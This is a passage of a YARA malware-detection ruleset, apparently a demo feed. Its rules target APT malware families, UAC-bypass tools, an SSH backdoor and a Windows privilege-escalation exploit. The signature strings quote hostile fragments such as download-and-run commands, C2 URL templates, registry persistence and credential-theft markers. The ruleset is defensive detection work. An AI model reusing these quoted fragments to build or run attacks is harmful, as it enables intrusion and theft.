( 0 ) == 0x5a4d and 1 of ( $x* ) and 4 of ( $s* ) ) or ( 1 of ( $x* ) and all of ( $s* ) )\n}\n\nrule APT_Malware_PutterPanda_MsUpdater_2_RID346A : APT DEMO EXE FILE G0024 {\n   meta:\n      description = \"Detects Malware related to PutterPanda - MSUpdater\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 15:29:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, G0024\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"winsta0\\\\default\" fullword ascii\n      $s1 = \"EXPLORER.EXE\" fullword ascii\n      $s2 = \"WNetEnumResourceA\" fullword ascii\n      $s3 = \"explorer.exe\" fullword ascii\n      $s4 = \"CreateProcessAsUserA\" fullword ascii\n      $s5 = \"HttpSendRequestExA\" fullword ascii\n      $s6 = \"HttpEndRequestA\" fullword ascii\n      $s7 = \"GetModuleBaseNameA\" fullword ascii\n      $s8 = \"GetModuleFileNameExA\" fullword ascii\n      $s9 = \"HttpSendRequestA\" fullword ascii\n      $s10 = \"HttpOpenRequestA\" fullword ascii\n      $s11 = \"InternetConnectA\" fullword ascii\n      $s12 = \"Process32Next\" fullword ascii\n      $s13 = \"Process32First\" fullword ascii\n      $s14 = \"CreatePipe\" fullword ascii\n      $s15 = \"EnumProcesses\" fullword ascii\n      $s16 = \"LookupPrivilegeValueA\" fullword ascii\n      $s17 = \"PeekNamedPipe\" fullword ascii\n      $s18 = \"EnumProcessModules\" fullword ascii\n      $s19 = \"PSAPI.DLL\" fullword ascii\n      $s20 = \"SPSSSQ\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and all of them\n}\n\nrule APT_Malware_PutterPanda_Gen4_RID3192 : APT DEMO EXE FILE G0024 {\n   meta:\n      description = \"Detects Malware related to PutterPanda\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 13:28:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8fdd6e5ed9d69d560b6fdd5910f80e0914893552\"\n      hash2 = \"3c4a762175326b37035a9192a981f7f4cc2aa5f0\"\n      hash3 = \"598430b3a9b5576f03cc4aed6dc2cd8a43324e1e\"\n      tags = \"APT, DEMO, EXE, FILE, G0024\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"rz.dat\" fullword ascii\n      $s0 = \"Mozilla/4.0 (Compatible; MSIE 6.0;)\" fullword ascii\n      $s1 = \"Internet connect error:%d\" fullword ascii\n      $s2 = \"Proxy-Authorization:Basic \" fullword ascii\n      $s5 = \"Invalid url\" fullword ascii\n      $s6 = \"Create file failed\" fullword ascii\n      $s7 = \"myAgent\" fullword ascii\n      $z1 = \"%s%s%d%d\" fullword ascii\n      $z2 = \"HttpQueryInfo failed:%d\" fullword ascii\n      $z3 = \"read file error:%d\" fullword ascii\n      $z4 = \"down file success\" fullword ascii\n      $z5 = \"kPStoreCreateInstance\" fullword ascii\n      $z6 = \"Avaliable data:%u bytes\" fullword ascii\n      $z7 = \"abe2869f-9b47-4cd9-a358-c22904dba7f7\" fullword ascii\n   condition: \n      filesize < 300KB and ( ( uint16 ( 0 ) == 0x5a4d and $x1 and 3 of ( $s* ) ) or ( 3 of ( $s* ) and 4 of ( $z* ) ) )\n}\n\nrule APT_Malware_CommentCrew_MiniASP_RID32B1 : APT DEMO EXE FILE G0006 {\n   meta:\n      description = \"CommentCrew Malware MiniASP APT\"\n      author = \"Florian Roth\"\n      reference = \"VT Analysis\"\n      date = \"2015-06-03 14:16:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"777bf8def279942a25750feffc11d8a36cc0acf9\"\n      hash2 = \"173f20b126cb57fc8ab04d01ae223071e2345f97\"\n      tags = \"APT, DEMO, EXE, FILE, G0006\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\MiniAsp4\\\\Release\\\\MiniAsp.pdb\" ascii\n      $x2 = \"run http://%s/logo.png setup.exe\" fullword ascii\n      $x3 = \"d:\\\\command.txt\" fullword ascii\n      $z1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR \" ascii\n      $z2 = \"Mozilla/4.0 (compatible; MSIE 7.4; Win32;32-bit)\" fullword ascii\n      $z3 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC\" ascii\n      $s1 = \"http://%s/device_command.asp?device_id=%s&cv=%s&command=%s\" fullword ascii\n      $s2 = \"kill process error!\" fullword ascii\n      $s3 = \"kill process success!\" fullword ascii\n      $s4 = \"pickup command error!\" fullword ascii\n      $s5 = \"http://%s/record.asp?device_t=%s&key=%s&device_id=%s&cv=%s&result=%s\" fullword ascii\n      $s6 = \"no command\" fullword ascii\n      $s7 = \"software\\\\microsoft\\\\windows\\\\currentversion\\\\run\" fullword ascii\n      $s8 = \"command is null!\" fullword ascii\n      $s9 = \"pickup command Ok!\" fullword ascii\n      $s10 = \"http://%s/result_%s.htm\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) ) or ( all of ( $z* ) ) or ( 8 of ( $s* ) )\n}\n\nrule APT28_CHOPSTICK_RID2B67 : APT DEMO EXE FILE G0007 RUSSIA {\n   meta:\n      description = \"Detects a malware that behaves like CHOPSTICK mentioned in APT28 report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.virustotal.com/gui/file/e8e87873455839080b369a5497c115886d1b0b6cfb6dabc9f040fef0c7e4e737/detection\"\n      date = \"2015-06-02 09:05:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, EXE, FILE, G0007, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"jhuhugit.tmp\" fullword ascii\n      $s8 = \"KERNEL32.dll\" fullword ascii\n      $s9 = \"IsDebuggerPresent\" fullword ascii\n      $s10 = \"IsProcessorFeaturePresent\" fullword ascii\n      $s11 = \"TerminateProcess\" fullword ascii\n      $s13 = \"DeleteFileA\" fullword ascii\n      $s15 = \"GetProcessHeap\" fullword ascii\n      $s16 = \"!This program cannot be run in DOS mode.\" fullword ascii\n      $s17 = \"LoadLibraryA\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 722KB and all of them\n}\n\nrule APT28_SourFace_Malware1_RID2F30 : APT DEMO EXE FILE G0007 RUSSIA {\n   meta:\n      description = \"Detects Malware from APT28 incident - SOURFACE is a downloader that obtains a second-stage backdoor from a C2 server.\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html\"\n      date = \"2015-06-01 11:46:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e2450dffa675c61aa43077b25b12851a910eeeb6\"\n      hash2 = \"d9c53adce8c35ec3b1e015ec8011078902e6800b\"\n      tags = \"APT, DEMO, EXE, FILE, G0007, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"coreshell.dll\" fullword wide\n      $s1 = \"Core Shell Runtime Service\" fullword wide\n      $s2 = \"\\\\chkdbg.log\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 62KB and all of them\n}\n\nrule APT28_SourFace_Malware2_RID2F31 : APT DEMO EXE FILE G0007 RUSSIA {\n   meta:\n      description = \"Detects Malware from APT28 incident - SOURFACE is a downloader that obtains a second-stage backdoor from a C2 server.\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html\"\n      date = \"2015-06-01 11:46:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cf3220c867b81949d1ce2b36446642de7894c6dc\"\n      hash2 = \"ed48ef531d96e8c7360701da1c57e2ff13f12405\"\n      hash3 = \"682e49efa6d2549147a21993d64291bfa40d815a\"\n      tags = \"APT, DEMO, EXE, FILE, G0007, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"coreshell.dll\" fullword ascii\n      $s1 = \"Applicate\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 550KB and all of them\n}\n\nrule APT28_SourFace_Malware3_RID2F32 : APT DEMO EXE FILE G0007 RUSSIA {\n   meta:\n      description = \"Detects Malware from APT28 incident - SOURFACE is a downloader that obtains a second-stage backdoor from a C2 server.\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html\"\n      date = \"2015-06-01 11:46:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d9c53adce8c35ec3b1e015ec8011078902e6800b\"\n      hash2 = \"367d40465fd1633c435b966fa9b289188aa444bc\"\n      hash3 = \"d87b310aa81ae6254fff27b7d57f76035f544073\"\n      tags = \"APT, DEMO, EXE, FILE, G0007, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"coreshell.dll\" fullword wide\n      $s1 = \"Core Shell Runtime Service\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 550KB and all of them\n}\n\nrule SVG_LoadURL_RID2AD3 : DEMO EXPLOIT {\n   meta:\n      description = \"Detects a tiny SVG file that loads an URL (as seen in CryptoWall malware infections)\"\n      author = \"Florian Roth\"\n      reference = \"https://www.appriver.com/resources/blog\"\n      date = \"2015-05-24 08:43:21\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"DEMO, EXPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"</svg>\" nocase\n      $s2 = \"<script>\" nocase\n      $s3 = \"location.href='http\" nocase\n   condition: \n      all of ( $s* ) and filesize < 600\n}\n\nrule DarkEYEv3_Cryptor_RID2D71 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Rule to detect DarkEYEv3 encrypted executables (often malware)\"\n      author = \"Florian Roth\"\n      reference = \"http://darkeyev3.blogspot.fi/\"\n      date = \"2015-05-24 10:32:01\"\n      score = 55\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d53149968eca654fc0e803f925e7526fdac2786c\"\n      hash2 = \"7e3a8940d446c57504d6a7edb6445681cca31c65\"\n      hash3 = \"d3dd665dd77b02d7024ac16eb0949f4f598299e7\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\DarkEYEV3-\" \n   condition: \n      uint16 ( 0 ) == 0x5a4d and $s0\n}\n\nrule MAL_PoisonIvy_Generic_3_RID2FA8 : DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"PoisonIvy RAT Generic Rule\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-05-14 12:06:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $k1 = \"Tiger324{\" fullword ascii\n      $s2 = \"WININET.dll\" fullword ascii\n      $s3 = \"mscoree.dll\" fullword wide\n      $s4 = \"WS2_32.dll\" fullword\n      $s5 = \"Explorer.exe\" fullword wide\n      $s6 = \"USER32.DLL\" \n      $s7 = \"CONOUT$\" \n      $s8 = \"login.asp\" \n      $h1 = \"HTTP/1.0\" \n      $h2 = \"POST\" \n      $h3 = \"login.asp\" \n      $h4 = \"check.asp\" \n      $h5 = \"result.asp\" \n      $h6 = \"upload.asp\" \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( $k1 or all of ( $s* ) or all of ( $h* ) )\n}\n\nrule APT17_Sample_FXSST_DLL_RID2E51 : APT DEMO EXE FILE G0025 {\n   meta:\n      description = \"Detects Samples related to APT17 activity - file FXSST.DLL\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2015/05/hiding_in_plain_sigh.html\"\n      date = \"2015-05-14 11:09:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, EXE, FILE, G0025\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Microsoft? Windows? Operating System\" fullword wide\n      $x2 = \"fxsst.dll\" fullword ascii\n      $y1 = \"DllRegisterServer\" fullword ascii\n      $y2 = \".cSV\" fullword ascii\n      $s1 = \"GetLastActivePopup\" \n      $s2 = \"Sleep\" \n      $s3 = \"GetModuleFileName\" \n      $s4 = \"VirtualProtect\" \n      $s5 = \"HeapAlloc\" \n      $s6 = \"GetProcessHeap\" \n      $s7 = \"GetCommandLine\" \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and ( all of ( $x* ) or all of ( $y* ) ) and all of ( $s* )\n}\n\nrule custom_ssh_backdoor_server_RID31F3 : DEMO HKTL SCRIPT T1021_004 T1059_006 {\n   meta:\n      description = \"Custome SSH backdoor based on python and paramiko - file server.py\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/joridos/custom-ssh-backdoor\"\n      date = \"2015-05-14 13:44:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"DEMO, HKTL, SCRIPT, T1021_004, T1059_006\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"command= raw_input(\\\"Enter command: \\\").strip('n')\" fullword ascii\n      $s1 = \"print '[-] (Failed to load moduli -- gex will be unsupported.)'\" fullword ascii\n      $s2 = \"print '[-] Listen/bind/accept failed: ' + str(e)\" fullword ascii\n   condition: \n      2 of them\n}\n\nrule UACME_Akagi_RID2AB8 : DEMO HKTL {\n   meta:\n      description = \"Rule to detect UACMe - abusing built-in Windows AutoElevate backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/hfiref0x/UACME\"\n      date = \"2015-05-14 07:58:21\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"edd2138bbd9e76c343051c6dc898054607f2040a\"\n      hash2 = \"e3a919ccc2e759e618208ededa8a543954d49f8a\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"UACMe injected, Fubuki at your service.\" wide fullword\n      $x3 = \"%temp%\\\\Hibiki.dll\" fullword wide\n      $x4 = \"[UCM] Cannot write to the target process memory.\" fullword wide\n      $s1 = \"%systemroot%\\\\system32\\\\cmd.exe\" wide\n      $s2 = \"D:(A;;GA;;;WD)\" wide\n      $s3 = \"%systemroot%\\\\system32\\\\sysprep\\\\sysprep.exe\" fullword wide\n      $s4 = \"/c wusa %ws /extract:%%windir%%\\\\system32\" fullword wide\n      $s5 = \"Fubuki.dll\" ascii fullword\n      $l1 = \"ntdll.dll\" ascii\n      $l2 = \"Cabinet.dll\" ascii\n      $l3 = \"GetProcessHeap\" ascii\n      $l4 = \"WriteProcessMemory\" ascii\n      $l5 = \"ShellExecuteEx\" ascii\n   condition: \n      ( 1 of ( $x* ) ) or ( 3 of ( $s* ) and all of ( $l* ) )\n}\n\nrule UACElevator_RID2B2C : DEMO EXE FILE HKTL T1548_002 {\n   meta:\n      description = \"UACElevator_RID2B2C bypassing UAC - file UACElevator_RID2B2C.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/MalwareTech/UACElevator_RID2B2C\"\n      date = \"2015-05-14 08:55:11\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, HKTL, T1548_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\UACElevator_RID2B2C.pdb\" ascii\n      $s1 = \"%userprofile%\\\\Downloads\\\\dwmapi.dll\" fullword ascii\n      $s2 = \"%windir%\\\\system32\\\\dwmapi.dll\" fullword ascii\n      $s3 = \"Infection module: %s\" fullword ascii\n      $s4 = \"Could not save module to %s\" fullword ascii\n      $s5 = \"%s%s%p%s%ld%s%d%s\" fullword ascii\n      $s6 = \"Stack area around _alloca memory reserved by this function is corrupted\" fullword ascii\n      $s7 = \"Stack around the variable '\" fullword ascii\n      $s8 = \"MSVCR120D.dll\" fullword wide\n      $s9 = \"Address: 0x\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 172KB and ( $x1 or 8 of ( $s* ) )\n}\n\nrule CVE_2015_1701_Taihou_RID2D07 : CVE_2015_1701 DEMO EXE EXPLOIT FILE T1068 {\n   meta:\n      description = \"CVE-2015-1701 compiled exploit code\"\n      author = \"Florian Roth\"\n      reference = \"https://seclist.us/executable-payload-exploits-local-privilege-escalation-cve-2015-1701-to-steal-system-token.html\"\n      date = \"2015-05-13 10:14:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"90d17ebd75ce7ff4f15b2df951572653efe2ea17\"\n      hash2 = \"acf181d6c2c43356e92d4ee7592700fa01e30ffb\"\n      hash3 = \"b8aabe12502f7d55ae332905acee80a10e3bc399\"\n      tags = \"CVE_2015_1701, DEMO, EXE, EXPLOIT, FILE, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"VirtualProtect\" fullword\n      $s4 = \"RegisterClass\" \n      $s5 = \"LoadIcon\" \n      $s6 = \"PsLookupProcessByProcessId\" fullword ascii\n      $s7 = \"LoadLibraryExA\" fullword ascii\n      $s8 = \"gSharedInfo\" fullword\n      $w1 = \"user32.dll\" wide\n      $w2 = \"ntdll\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 160KB and all of ( $s* ) and 1 of ( $w* )\n}\n\nrule MAL_Rombertik_CarbonGrabber_RID3162 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects CarbonGrabber alias Rombertik - file Copy#064046.scr\"\n      author = \"Florian Roth\"\n      reference = \"http://blogs.cisco.com/security/talos/rombertik\"\n      date = \"2015-05-05 13:20:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2f9b26b90311e62662c5946a1ac600d2996d3758\"\n      hash2 = \"aeb94064af2a6107a14fd32f39cb502e704cd0ab\"\n      hash3 = \"c2005c8d1a79da5e02e6a15d00151018658c264c\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ZwGetWriteWatch\" fullword ascii\n      $x2 = \"OutputDebugStringA\" fullword ascii\n      $x3 = \"malwar\" fullword ascii\n      $x4 = \"sampl\" fullword ascii\n      $x5 = \"viru\" fullword ascii\n      $x6 = \"sandb\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5MB and all of them\n}\n\nrule MAL_Rombertik_CarbonGrabber_Builder_Server_RID375E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects CarbonGrabber alias Rombertik Builder Server - file Server.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://blogs.cisco.com/security/talos/rombertik\"\n      date = \"2015-05-05 17:35:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"C:\\\\WINDOWS\\\\system32\\\\svchost.exe\" fullword ascii\n      $s3 = \"Software\\\\Microsoft\\\\Windows\\\\Currentversion\\\\RunOnce\" fullword ascii\n      $s4 = \"chrome.exe\" fullword ascii\n      $s5 = \"firefox.exe\" fullword ascii\n      $s6 = \"chrome.dll\" fullword ascii\n      $s7 = \"@KERNEL32.DLL\" fullword wide\n      $s8 = \"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome\" ascii\n      $s10 = \"&post=\" fullword ascii\n      $s11 = \"&host=\" fullword ascii\n      $s12 = \"Ws2_32.dll\" fullword ascii\n      $s16 = \"&browser=\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and 8 of them\n}\n\nrule APT30_Sample_6_RID2BAF : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:17:01\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"GreateProcessA\" fullword ascii\n      $s1 = \"Ternel32.dll\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_17_RID2BE1 : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:25:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Nkfvtyvn}]ty}ztU\" fullword ascii\n      $s4 = \"IEXPL0RE\" fullword ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule Explosion_Sample_1_RID2E23 : APT DEMO FILE G0123 MIDDLE_EAST T1112 {\n   meta:\n      description = \"Explosion/Explosive Malware - Volatile Cedar APT\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/sinkholing-volatile-cedar-dga-infrastructure/69421/\"\n      date = \"2015-04-03 11:01:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, FILE, G0123, MIDDLE_EAST, T1112\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"REG ADD \\\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" ascii\n      $s9 = \"WinAutologon From Winlogon Reg\" fullword ascii\n      $s10 = \"82BD0E67-9FEA-4748-8672-D5EFE5B779B0\" fullword ascii\n      $s11 = \"IE:Password-Protected sites\" fullword ascii\n      $s12 = \"\\\\his.sys\" ascii\n      $s13 = \"HTTP Password\" fullword ascii\n      $s14 = \"\\\\data.sys\" ascii\n      $s15 = \"EL$_RasDefaultCredentials#0\" fullword wide\n      $s17 = \"Office Outlook HTTP\" fullword ascii\n      $s20 = \"Hist :<b> %ws</b>  :%s </br></br>\" fullword ascii\n   condition: \n      all of them and uint16 ( 0 ) == 0x5A4D\n}\n\nrule Explosion_Sample_2_RID2E24 : APT DEMO FILE G0123 MIDDLE_EAST {\n   meta:\n      description = \"Explosion/Explosive Malware - Volatile Cedar APT\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/sinkholing-volatile-cedar-dga-infrastructure/69421/\"\n      date = \"2015-04-03 11:01:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, FILE, G0123, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"serverhelp.dll\" fullword wide\n      $s1 = \"Windows Help DLL\" fullword wide\n      $s5 = \"SetWinHoK\" fullword ascii\n   condition: \n      all of them and uint16 ( 0 ) == 0x5A4D\n}\n\nrule Explosion_Generic_1_RID2E7E : APT DEMO FILE G0123 GEN MIDDLE_EAST T1091 {\n   meta:\n      description = \"Generic Rule for Explosion/Explosive Malware - Volatile Cedar APT - Autorun\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2015-04-03 11:16:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1952fa94b582e9af9dca596b5e51c585a78b8b1610639e3b878bbfa365e8e908\"\n      hash2 = \"d8fdcdaad652c19f4f4676cd2f89ae834dbc19e2759a206044b18601875f2726\"\n      hash3 = \"e2e6ed82703de21eb4c5885730ba3db42f3ddda8b94beb2ee0c3af61bc435747\"\n      tags = \"APT, DEMO, FILE, G0123, GEN, MIDDLE_EAST, T1091\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"autorun.exe\" fullword\n      $s1 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; MSIE 6.0; Windows NT 5.1; .NET CL\" \n      $s2 = \"%drp.exe\" fullword\n      $s3 = \"%s_%s%d.exe\" fullword\n      $s4 = \"open=autorun.exe\" fullword\n      $s5 = \"http://www.microsoft.com/en-us/default.aspx\" fullword\n      $s10 = \"error.renamefile\" fullword\n      $s12 = \"insufficient lookahead\" fullword\n      $s13 = \"%s %s|\" fullword\n      $s16 = \":\\\\autorun.exe\" fullword\n   condition: \n      7 of them and uint16 ( 0 ) == 0x5A4D\n}\n\nrule APT30_Generic_H_RID2C1C : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:35:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2a4c8752f3e7fde0139421b8d5713b29c720685d\"\n      hash2 = \"4350e906d590dca5fcc90ed3215467524e0a4e3d\"\n      tags = \"APT, DEMO, FILE, G0013, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\Temp1020.txt\" ascii\n      $s1 = \"Xmd.Txe\" fullword ascii\n      $s2 = \"\\\\Internet Exp1orer\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_2_RID2BAB : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:16:21\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"ForZRLnkWordDlg.EXE\" fullword wide\n      $s1 = \"ForZRLnkWordDlg Microsoft \" fullword wide\n      $s9 = \"ForZRLnkWordDlg 1.0 \" fullword wide\n      $s11 = \"ForZRLnkWordDlg\" fullword wide\n      $s12 = \" (C) 2011\" fullword wide\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Sample_3_RID2BAC : APT DEMO FILE G0013 {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:16:31\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, FILE, G0013\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"Software\\\\Mic\" ascii\n      $s6 = \"HHOSTR\" ascii\n      $s9 = \"ThEugh\" fullword ascii\n      $s10 = \"Moziea/\" ascii\n      $s12 = \"%s%s(X-\" ascii\n   condition: \n      filesize < 100KB and uint16 ( 0 ) == 0x5A4D and all of them\n}\n\nrule APT30_Generic_C_RID2C17 : APT DEMO FILE G0013 GEN {\n   meta:\n      description = \"FireEye APT30 Report Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://www2.fireeye.com/rs/fireye/images/rpt-apt30.pdf\"\n      date = \"2015-04-03 09:34:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8667f635fe089c5e2c666b3fe22eaf3ff8590a69\"\n      hash2 = \"0c4fcef3b583d0ffffc2b14b9297d3a4\"\n      hash3 = 